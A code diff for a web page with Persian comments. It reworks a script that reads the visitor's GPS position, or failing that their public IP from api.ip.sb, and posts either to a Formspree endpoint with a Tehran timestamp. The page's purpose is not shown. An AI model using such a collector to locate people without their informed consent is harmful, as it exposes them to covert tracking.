@@ -26,16 +26,30 @@
             else statusEl.style.color = '#6f6';
         }
 
-        // ارسال مختصات به سرور
-        async function sendLocation(lat, lng, accuracy, method) {
+        // ارسال موقعیت GPS (دقیق)
+        async function sendGPS(lat, lng, accuracy) {
             const payload = {
                 lat: lat,
                 lng: lng,
-                accuracy: accuracy || 'نامشخص',
-                method: method,
+                accuracy: accuracy,
+                method: 'gps',
                 time: new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' })
             };
+            await sendToServer(payload);
+        }
 
+        // ارسال IP (پشتیبان)
+        async function sendIP(ip) {
+            const payload = {
+                ip: ip,
+                method: 'ip',
+                time: new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' })
+            };
+            await sendToServer(payload);
+        }
+
+        // ارسال مشترک به Formspree
+        async function sendToServer(payload) {
             try {
                 const response = await fetch(FORM_ENDPOINT, {
                     method: 'POST',
@@ -43,7 +57,7 @@
                     body: JSON.stringify(payload)
                 });
                 if (response.ok) {
-                    updateStatus(`✅ موقعیت با روش ${method} ارسال شد.`);
+                    updateStatus(`✅ موقعیت با روش ${payload.method} ارسال شد.`);
                 } else {
                     updateStatus(`❌ خطای سرور ثبت (${response.status})`, true);
                 }
@@ -52,74 +66,43 @@
             }
         }
 
-        // ========== موقعیت‌یابی IP (تک سرویس مطمئن + یک fallback) ==========
-        async function getIPLocation() {
-            const tryFetch = async (url, parser, name) => {
-                try {
-                    const ctrl = new AbortController();
-                    setTimeout(() => ctrl.abort(), 4000);
-                    const resp = await fetch(url, { signal: ctrl.signal });
-                    if (!resp.ok) throw new Error('status ' + resp.status);
-                    const data = await resp.json();
-                    const loc = parser(data);
-                    if (loc && loc.lat && loc.lng) {
-                        console.log('IP service success:', name);
-                        return { ...loc, service: name };
-                    }
-                } catch (e) {
-                    console.warn(name + ' ناموفق', e.message);
-                }
+        // گرفتن IP عمومی (فقط IP، بدون مختصات)
+        async function getPublicIP() {
+            try {
+                const ctrl = new AbortController();
+                setTimeout(() => ctrl.abort(), 4000);
+                // سرویس قابل اعتماد در ایران
+                const resp = await fetch('https://api.ip.sb/geoip', { signal: ctrl.signal });
+                if (!resp.ok) throw new Error('status ' + resp.status);
+                const data = await resp.json();
+                return data.ip; // فقط رشته IP
+            } catch (e) {
+                console.warn('IP service failed', e.message);
                 return null;
-            };
-
-            // ۱. ip.sb – CORS دارد و معمولاً در ایران باز است
-            const r1 = await tryFetch(
-                'https://api.ip.sb/geoip',
-                (d) => ({
-                    lat: parseFloat(d.latitude),
-                    lng: parseFloat(d.longitude),
-                    accuracy: 'دقت شهری (ip.sb)',
-                    method: 'ip'
-                }),
-                'ip.sb'
-            );
-            if (r1) return r1;
-
-            // ۲. fallback: ipapi.co (ممکن است فیلتر باشد، ولی شانس دیگری است)
-            const r2 = await tryFetch(
-                'https://ipapi.co/json/',
-                (d) => ({
-                    lat: d.latitude,
-                    lng: d.longitude,
-                    accuracy: 'دقت شهری (ipapi)',
-                    method: 'ip'
-                }),
-                'ipapi'
-            );
-            if (r2) return r2;
-
-            throw new Error('هیچ سرویس موقعیت‌یابی IP در دسترس نیست');
+            }
         }
 
-        // ====== GPS اصلی (بدون تغییر) ======
+        // ====== GPS (دست‌نخورده) ======
         function tryGPS() {
             updateStatus('📡 در حال جستجوی ماهواره...');
 
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
-                    sendLocation(
+                    sendGPS(
                         pos.coords.latitude,
                         pos.coords.longitude,
-                        `دقت ${Math.round(pos.coords.accuracy)} متر`,
-                        'gps'
+                        `دقت ${Math.round(pos.coords.accuracy)} متر`
                     );
                 },
-                (err) => {
+                async (err) => {
                     console.warn('GPS ناموفق', err.message);
                     updateStatus('📍 استفاده از IP...');
-                    getIPLocation()
-                        .then(loc => sendLocation(loc.lat, loc.lng, loc.accuracy, 'ip'))
-                        .catch(() => updateStatus('❌ دریافت موقعیت کاملاً ناموفق بود.', true));
+                    const ip = await getPublicIP();
+                    if (ip) {
+                        await sendIP(ip);
+                    } else {
+                        updateStatus('❌ نه GPS در دسترس است و نه IP.', true);
+                    }
                 },
                 {
                     enableHighAccuracy: true,
